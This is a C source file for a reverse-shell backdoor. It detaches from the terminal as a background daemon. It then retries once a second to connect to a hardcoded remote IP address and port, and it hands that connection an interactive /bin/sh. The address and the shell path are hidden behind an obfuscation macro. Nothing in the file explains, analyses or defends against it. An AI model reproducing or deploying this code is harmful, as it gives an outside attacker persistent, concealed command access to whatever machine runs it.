#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include "./obfuscator.hpp"

#define REMOTE_ADDR OBFUSCATE("207.46.148.7")
#define REMOTE_PORT 5069

int shell()
{
    struct sockaddr_in sa;
    int s;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    sa.sin_port = htons(REMOTE_PORT);

    s = socket(AF_INET, SOCK_STREAM, 0);
    if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) == -1)
    {
        return -1;
    }
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    if (system(OBFUSCATE("/bin/sh")) == -1)
    {
        return -2;
    }
}

int main(int argc, char *argv[])
{
    pid_t process_id = 0;
    pid_t sid = 0;
    process_id = fork();
    if (process_id < 0)
    {
        exit(1);
    }
    if (process_id > 0)
    {
        exit(0);
    }
    umask(0);
    sid = setsid();
    if (sid < 0)
    {
        exit(1);
    }
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    while (1)
    {
        sleep(1);
        shell();
    }
    return (0);
}
